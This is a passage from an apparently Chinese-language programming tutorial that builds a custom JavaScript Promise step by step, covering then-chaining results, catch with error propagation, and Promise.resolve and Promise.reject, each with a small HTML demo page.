class_">Promise</span>)&#123;</span><br><span class="line">                    <span class="comment">//如果是 Promise 类型的对象</span></span><br><span class="line">                    result.<span class="title function_">then</span>(<span class="function"><span class="params">v</span> =&gt;</span> &#123;</span><br><span class="line">                        <span class="title function_">resolve</span>(v);</span><br><span class="line">                    &#125;, <span class="function"><span class="params">r</span>=&gt;</span>&#123;</span><br><span class="line">                        <span class="title function_">reject</span>(r);</span><br><span class="line">                    &#125;)</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="comment">//结果的对象状态为『成功』</span></span><br><span class="line">                    <span class="title function_">resolve</span>(result);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">                <span class="title function_">reject</span>(e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//调用回调函数  PromiseState</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">this</span>.<span class="property">PromiseState</span> === <span class="string">&#x27;fulfilled&#x27;</span>)&#123;</span><br><span class="line">            <span class="title function_">callback</span>(onResolved);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">this</span>.<span class="property">PromiseState</span> === <span class="string">&#x27;rejected&#x27;</span>)&#123;</span><br><span class="line">            <span class="title function_">callback</span>(onRejected);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//判断 pending 状态</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">this</span>.<span class="property">PromiseState</span> === <span class="string">&#x27;pending&#x27;</span>)&#123;</span><br><span class="line">            <span class="comment">//保存回调函数</span></span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">callbacks</span>.<span class="title function_">push</span>(&#123;</span><br><span class="line">                <span class="attr">onResolved</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                    <span class="title function_">callback</span>(onResolved);</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">onRejected</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                    <span class="title function_">callback</span>(onRejected);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Promise-封装 | 10 - 异步任务 then 返回结果<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;./promise.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//实例化对象</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">let</span> p = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="comment">// resolve(&#x27;OK&#x27;);</span></span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">reject</span>(<span class="string">&quot;Error&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">            &#125;, <span class="number">1000</span>)</span></span><br><span class="line"><span class="language-javascript">        &#125;);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//执行 then 方法</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> res = p.<span class="title function_">then</span>(<span class="function"><span class="params">value</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// return &#x27;oh Yeah&#x27;;</span></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">throw</span> <span class="string">&#x27;error&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">        &#125;, <span class="function"><span class="params">reason</span>=&gt;</span>&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// console.warn(reason);</span></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">throw</span> <span class="string">&#x27;error&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">        &#125;);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>(res);</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="catch方法与异常穿透"><a href="#catch方法与异常穿透" class="headerlink" title="catch方法与异常穿透"></a>catch方法与异常穿透</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//声明构造函数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Promise</span>(<span class="params">executor</span>)&#123;</span><br><span class="line">    <span class="comment">//添加属性</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">PromiseState</span> = <span class="string">&#x27;pending&#x27;</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">PromiseResult</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">//声明属性</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">callbacks</span> = [];</span><br><span class="line">    <span class="comment">//保存实例对象的 this 的值</span></span><br><span class="line">    <span class="keyword">const</span> self = <span class="variable language_">this</span>;<span class="comment">// self _this that</span></span><br><span class="line">    <span class="comment">//resolve 函数</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">resolve</span>(<span class="params">data</span>)&#123;</span><br><span class="line">        <span class="comment">//判断状态</span></span><br><span class="line">        <span class="keyword">if</span>(self.<span class="property">PromiseState</span> !== <span class="string">&#x27;pending&#x27;</span>) <span class="keyword">return</span>;</span><br><span class="line">        <span class="comment">//1. 修改对象的状态 (promiseState)</span></span><br><span class="line">        self.<span class="property">PromiseState</span> = <span class="string">&#x27;fulfilled&#x27;</span>;<span class="comment">// resolved</span></span><br><span class="line">        <span class="comment">//2. 设置对象结果值 (promiseResult)</span></span><br><span class="line">        self.<span class="property">PromiseResult</span> = data;</span><br><span class="line">        <span class="comment">//调用成功的回调函数</span></span><br><span class="line">        self.<span class="property">callbacks</span>.<span class="title function_">forEach</span>(<span class="function"><span class="params">item</span> =&gt;</span> &#123;</span><br><span class="line">            item.<span class="title function_">onResolved</span>(data);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//reject 函数</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">reject</span>(<span class="params">data</span>)&#123;</span><br><span class="line">        <span class="comment">//判断状态</span></span><br><span class="line">        <span class="keyword">if</span>(self.<span class="property">PromiseState</span> !== <span class="string">&#x27;pending&#x27;</span>) <span class="keyword">return</span>;</span><br><span class="line">        <span class="comment">//1. 修改对象的状态 (promiseState)</span></span><br><span class="line">        self.<span class="property">PromiseState</span> = <span class="string">&#x27;rejected&#x27;</span>;<span class="comment">// </span></span><br><span class="line">        <span class="comment">//2. 设置对象结果值 (promiseResult)</span></span><br><span class="line">        self.<span class="property">PromiseResult</span> = data;</span><br><span class="line">        <span class="comment">//执行失败的回调</span></span><br><span class="line">        self.<span class="property">callbacks</span>.<span class="title function_">forEach</span>(<span class="function"><span class="params">item</span> =&gt;</span> &#123;</span><br><span class="line">            item.<span class="title function_">onRejected</span>(data);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="comment">//同步调用『执行器函数』</span></span><br><span class="line">        <span class="title function_">executor</span>(resolve, reject);</span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">        <span class="comment">//修改 promise 对象状态为『失败』</span></span><br><span class="line">        <span class="title function_">reject</span>(e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//添加 then 方法</span></span><br><span class="line"><span class="title class_">Promise</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">then</span> = <span class="keyword">function</span>(<span class="params">onResolved, onRejected</span>)&#123;</span><br><span class="line">    <span class="keyword">const</span> self = <span class="variable language_">this</span>;</span><br><span class="line">    <span class="comment">//判断回调函数参数</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">typeof</span> onRejected !== <span class="string">&#x27;function&#x27;</span>)&#123;</span><br><span class="line">        <span class="comment">// 设置失败的回调函数</span></span><br><span class="line">        onRejected = <span class="function"><span class="params">reason</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> reason;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">typeof</span> onResolved !== <span class="string">&#x27;function&#x27;</span>)&#123;</span><br><span class="line">        onResolved = <span class="function"><span class="params">value</span> =&gt;</span> value;</span><br><span class="line">        <span class="comment">//onResolved = value =&gt; &#123; return value&#125;;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">//封装函数</span></span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">callback</span>(<span class="params">type</span>)&#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                <span class="comment">//获取回调函数的执行结果</span></span><br><span class="line">                <span class="keyword">let</span> result = <span class="title function_">type</span>(self.<span class="property">PromiseResult</span>);</span><br><span class="line">                <span class="comment">//判断</span></span><br><span class="line">                <span class="keyword">if</span>(result <span class="keyword">instanceof</span> <span class="title class_">Promise</span>)&#123;</span><br><span class="line">                    <span class="comment">//如果是 Promise 类型的对象</span></span><br><span class="line">                    result.<span class="title function_">then</span>(<span class="function"><span class="params">v</span> =&gt;</span> &#123;</span><br><span class="line">                        <span class="title function_">resolve</span>(v);</span><br><span class="line">                    &#125;, <span class="function"><span class="params">r</span>=&gt;</span>&#123;</span><br><span class="line">                        <span class="title function_">reject</span>(r);</span><br><span class="line">                    &#125;)</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="comment">//结果的对象状态为『成功』</span></span><br><span class="line">                    <span class="title function_">resolve</span>(result);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">                <span class="title function_">reject</span>(e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//调用回调函数  PromiseState</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">this</span>.<span class="property">PromiseState</span> === <span class="string">&#x27;fulfilled&#x27;</span>)&#123;</span><br><span class="line">            <span class="title function_">callback</span>(onResolved);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">this</span>.<span class="property">PromiseState</span> === <span class="string">&#x27;rejected&#x27;</span>)&#123;</span><br><span class="line">            <span class="title function_">callback</span>(onRejected);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//判断 pending 状态</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">this</span>.<span class="property">PromiseState</span> === <span class="string">&#x27;pending&#x27;</span>)&#123;</span><br><span class="line">            <span class="comment">//保存回调函数</span></span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">callbacks</span>.<span class="title function_">push</span>(&#123;</span><br><span class="line">                <span class="attr">onResolved</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                    <span class="title function_">callback</span>(onResolved);</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">onRejected</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                    <span class="comment">// onRejected是undefined的，不是函数</span></span><br><span class="line">                    <span class="title function_">callback</span>(onRejected);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//添加 catch 方法</span></span><br><span class="line"><span class="title class_">Promise</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">catch</span> = <span class="keyword">function</span>(<span class="params">onRejected</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">then</span>(<span class="literal">undefined</span>, onRejected);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Promise-封装 | 11 - catch 方法与异常穿透<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;./promise.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//实例化对象</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">let</span> p = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="comment">// reject(&#x27;OK&#x27;);</span></span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">resolve</span>(<span class="string">&#x27;OK&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">            &#125;, <span class="number">1000</span>);</span></span><br><span class="line"><span class="language-javascript">        &#125;);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//异常穿透，then方法中只传了成功的回调函数，失败的回调函数是undefined</span></span></span><br><span class="line"><span class="language-javascript">        p.<span class="title function_">then</span>(<span class="function"><span class="params">value</span>=&gt;</span>&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">222</span>);</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">throw</span> <span class="string">&#x27;error&#x27;</span></span></span><br><span class="line"><span class="language-javascript">        &#125;).<span class="title function_">then</span>(<span class="function"><span class="params">value</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">333</span>);</span></span><br><span class="line"><span class="language-javascript">        &#125;).<span class="title function_">catch</span>(<span class="function"><span class="params">reason</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">console</span>.<span class="title function_">warn</span>(reason);</span></span><br><span class="line"><span class="language-javascript">        &#125;);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//值传递，then方法中连个回调函数都是undefined</span></span></span><br><span class="line"><span class="language-javascript">        p.<span class="title function_">then</span>().<span class="title function_">then</span>(<span class="function"><span class="params">value</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">333</span>);</span></span><br><span class="line"><span class="language-javascript">        &#125;).<span class="title function_">catch</span>(<span class="function"><span class="params">reason</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">console</span>.<span class="title function_">warn</span>(reason);</span></span><br><span class="line"><span class="language-javascript">        &#125;);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Promise-resolve-和-Promise-reject-封装"><a href="#Promise-resolve-和-Promise-reject-封装" class="headerlink" title="Promise.resolve 和 Promise.reject 封装"></a>Promise.resolve 和 Promise.reject 封装</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//声明构造函数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Promise</span>(<span class="params">executor</span>)&#123;</span><br><span class="line">    <span class="comment">//添加属性</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">PromiseState</span> = <span class="string">&#x27;pending&#x27;</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">PromiseResult</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">//声明属性</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">callbacks</span> = [];</span><br><span class="line">    <span class="comment">//保存实例对象的 this 的值</span></span><br><span class="line">    <span class="keyword">const</span> self = <span class="variable language_">this</span>;<span class="comment">// self _this that</span></span><br><span class="line">    <span class="comment">//resolve 函数</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">resolve</span>(<span class="params">data</span>)&#123;</span><br><span class="line">        <span class="comment">//判断状态</span></span><br><span class="line">        <span class="keyword">if</span>(self.<span class="property">PromiseState</span> !== <span class="string">&#x27;pending&#x27;</span>) <span class="keyword">return</span>;</span><br><span class="line">        <span class="comment">//1. 修改对象的状态 (promiseState)</span></span><br><span class="line">        self.<span class="property">PromiseState</span> = <span class="string">&#x27;fulfilled&#x27;</span>;<span class="comment">// resolved</span></span><br><span class="line">        <span class="comment">//2. 设置对象结果值 (promiseResult)</span></span><br><span class="line">        self.<span class="property">PromiseResult</span> = data;</span><br><span class="line">        <span class="comment">//调用成功的回调函数</span></span><br><span class="line">        self.<span class="property">callbacks</span>.<span class="title function_">forEach</span>(<span class="function"><span class="params">item</span> =&gt;</span> &#123;</span><br><span class="line">            item.<span class="title function_">onResolved</span>(data);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//reject 函数</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">reject</span>(<span class="params">data</span>)&#123;</span><br><span class="line">        <span class="comment">//判断状态</span></span><br><span class="line">        <span class="keyword">if</span>(self.<span class="property">PromiseState</span> !== <span class="string">&#x27;pending&#x27;</span>) <span class="keyword">return</span>;</span><br><span class="line">        <span class="comment">//1. 修改对象的状态 (promiseState)</span></span><br><span class="line">        self.<span class="property">PromiseState</span> = <span class="string">&#x27;rejected&#x27;</span>;<span class="comment">// </span></span><br><span class="line">        <span class="comment">//2. 设置对象结果值 (promiseResult)</span></span><br><span class="line">        self.<span class="property">PromiseResult</span> = data;</span><br><span class="line">        <span class="comment">//执行失败的回调</span></span><br><span class="line">        self.<span class="property">callbacks</span>.<span class="title function_">forEach</span>(<span class="function"><span class="params">item</span> =&gt;</span> &#123;</span><br><span class="line">            item.<span class="title function_">onRejected</span>(data);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="comment">//同步调用『执行器函数』</span></span><br><span class="line">        <span class="title function_">executor</span>(resolve, reject);</span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">        <span class="comment">//修改 promise 对象状态为『失败』</span></span><br><span class="line">        <span class="title function_">reject</span>(e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//添加 then 方法</span></span><br><span class="line"><span class="title class_">Promise</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">then</span> = <span class="keyword">function</span>(<span class="params">onResolved, onRejected</span>)&#123;</span><br><span class="line">    <span class="keyword">const</span> self = <span class="variable language_">this</span>;</span><br><span class="line">    <span class="comment">//判断回调函数参数</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">typeof</span> onRejected !== <span class="string">&#x27;function&#x27;</span>)&#123;</span><br><span class="line">        onRejected = <span class="function"><span class="params">reason</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> reason;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">typeof</span> onResolved !== <span class="string">&#x27;function&#x27;</span>)&#123;</span><br><span class="line">        onResolved = <span class="function"><span class="params">value</span> =&gt;</span> value;</span><br><span class="line">        <span class="comment">//value =&gt; &#123; return value&#125;;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">//封装函数</span></span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">callback</span>(<span class="params">type</span>)&#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                <span class="comment">//获取回调函数的执行结果</span></span><br><span class="line">                <span class="keyword">let</span> result = <span class="title function_">type</span>(self.<span class="property">PromiseResult</span>);</span><br><span class="line">                <span class="comment">//判断</span></span><br><span class="line">                <span class="keyword">if</span>(result <span class="keyword">instanceof</span> <span class="title class_">Promise</span>)&#123;</span><br><span class="line">                    <span class="comment">//如果是 Promise 类型的对象</span></span><br><span class="line">                    result.<span class="title function_">then</span>(<span class="function"><span class="params">v</span> =&gt;</span> &#123;</span><br><span class="line">                        <span class="title function_">resolve</span>(v);</span><br><span class="line">                    &#125;, <span class="function"><span class="params">r</span>=&gt;</span>&#123;</span><br><span class="line">                        <span class="title function_">reject</span>(r);</span><br><span class="line">                    &#125;)</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="comment">//结果的对象状态为『成功』</span></span><br><span class="line">                    <span class="title function_">resolve</span>(result);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">                <span class="title function_">reject</span>(e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//调用回调函数  PromiseState</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">this</span>.<span class="property">PromiseState</span> === <span class="string">&#x27;fulfilled&#x27;</span>)&#123;</span><br><span class="line">            <span class="title function_">callback</span>(onResolved);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">this</span>.<span class="property">PromiseState</span> === <span class="string">&#x27;rejected&#x27;</span>)&#123;</span><br><span class="line">            <span class="title function_">callback</span>(onRejected);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//判断 pending 状态</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">this</span>.<span class="property">PromiseState</span> === <span class="string">&#x27;pending&#x27;</span>)&#123;</span><br><span class="line">            <span class="comment">//保存回调函数</span></span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">callbacks</span>.<span class="title function_">push</span>(&#123;</span><br><span class="line">                <span class="attr">onResolved</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                    <span class="title function_">callback</span>(onResolved);</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">onRejected</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                    <span class="title function_">callback</span>(onRejected);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//添加 catch 方法</span></span><br><span class="line"><span class="title class_">Promise</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">catch</span> = <span class="keyword">function</span>(<span class="params">onRejected</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">then</span>(<span class="literal">undefined</span>, onRejected);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//添加 resolve 方法</span></span><br><span class="line"><span class="title class_">Promise</span>.<span class="property">resolve</span> = <span class="keyword">function</span>(<span class="params">value</span>)&#123;</span><br><span class="line">    <span class="comment">//返回promise对象</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(value <span class="keyword">instanceof</span> <span class="title class_">Promise</span>)&#123;</span><br><span class="line">            value.<span class="title function_">then</span>(<span class="function"><span class="params">v</span>=&gt;</span>&#123;</span><br><span class="line">                <span class="title function_">resolve</span>(v);</span><br><span class="line">            &#125;, <span class="function"><span class="params">r</span>=&gt;</span>&#123;</span><br><span class="line">                <span class="title function_">reject</span>(r);</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">//状态设置为成功</span></span><br><span class="line">            <span class="title function_">resolve</span>(value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//添加 reject 方法</span></span><br><span class="line"><span class="title class_">Promise</span>.<span class="property">reject</span> = <span class="keyword">function</span>(<span class="params">reason</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>)=&gt;</span>&#123;</span><br><span class="line">        <span class="title function_">reject</span>(reason);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Promise-封装 | 12 - Promise.resolve 封装<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;./promise.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> p = <span class="title class_">Promise</span>.<span class="title function_">resolve</span>(<span class="string">&#x27;OK&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> p2 = <span class="title class_">Promise</span>.<span class="title function_">resolve</span>(<span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// resolve(&#x27;Success&#x27;);</span></span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">reject</span>(<span class="string">&quot;error&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;));</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> p3 = <span class="title class_">Promise</span>.<span class="title function_">resolve</span>(<span class="title 